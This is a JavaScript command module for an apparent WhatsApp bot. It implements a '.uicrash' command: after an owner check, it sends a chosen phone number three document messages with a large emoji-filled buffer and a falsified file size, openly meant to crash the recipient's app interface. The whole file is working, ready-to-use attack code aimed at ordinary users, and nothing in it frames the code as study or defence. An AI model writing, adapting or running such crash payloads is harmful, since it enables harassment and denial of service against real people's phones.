const fs = require("fs");
const path = require("path");

module.exports = async function ({ conn, m, args, reply }) {
  try {
    // 📍 Extract & clean sender number
    const getCleanNumber = (jid) => jid ? jid.replace(/\D/g, "") : null;
    const senderJid =
      m.key?.participant ||
      m.participant ||
      m.sender ||
      m.key?.remoteJid ||
      (m.key?.fromMe && conn?.user?.id) ||
      m.message?.extendedTextMessage?.contextInfo?.participant;

    const senderNum = getCleanNumber(senderJid);
    if (!senderNum) return reply("❌ Unable to detect sender.");

    // 📂 Load selfmode.json
    const selfPath = path.join(__dirname, "media", "selfmode.json");

    if (!fs.existsSync(selfPath)) {
      return reply("⚠️ *Bot isn't activated yet.* Ask the owner to run `.self`\n\n> 𝐋 𝐔 𝐂 𝐈 𝐅 𝐄 𝐑 ❦ ✓");
    }

    let jsonData;
    try {
      jsonData = JSON.parse(fs.readFileSync(selfPath, "utf-8"));
    } catch {
      return reply("❌ Error reading `selfmode.json`. File may be corrupted.");
    }

    const realOwner = jsonData.owner_sender;
    if (senderNum !== realOwner) {
      return reply("🚫 *Access Denied!*\n\nOnly the *Real Bot Owner* can use `.uicrash`\n\n> 𝐋 𝐔 𝐂 𝐈 𝐅 𝐄 𝐑 ❦ ✓");
    }

    // ⚠️ Check target argument
    if (!args[0]) return reply("❌ Provide a number.\nExample: `.uicrash 923xx...`");

    const targetNum = args[0].replace(/\D/g, "");
    const targetJid = targetNum + "@s.whatsapp.net";

    // 💥 Heavy buffer doc payload
    const buffer = Buffer.alloc(99999, '💥');
    const docMessage = {
      document: buffer,
      mimetype: 'application/octet-stream',
      fileName: 'Crash_UICode.doc',
      fileLength: 999999999,
      caption: '💣 UI Crash by MegaTron Bot',
    };

    // 🚀 Send 3 times
    for (let i = 0; i < 3; i++) {
      await conn.sendMessage(targetJid, docMessage, { quoted: m });
      await new Promise(resolve => setTimeout(resolve, 100));
    }

    return reply("✅ *UI CRASH doc sent to:* " + args[0] + "\n\n> 𝐋 𝐔 𝐂 𝐈 𝐅 𝐄 𝐑 ❦ ✓");

  } catch (err) {
    console.error("❌ uicrash error:", err);
    return reply("❌ Something went wrong while executing `.uicrash`\n\n> 𝐋 𝐔 𝐂 𝐈 𝐅 𝐄 𝐑 ❦ ✓");
  }
};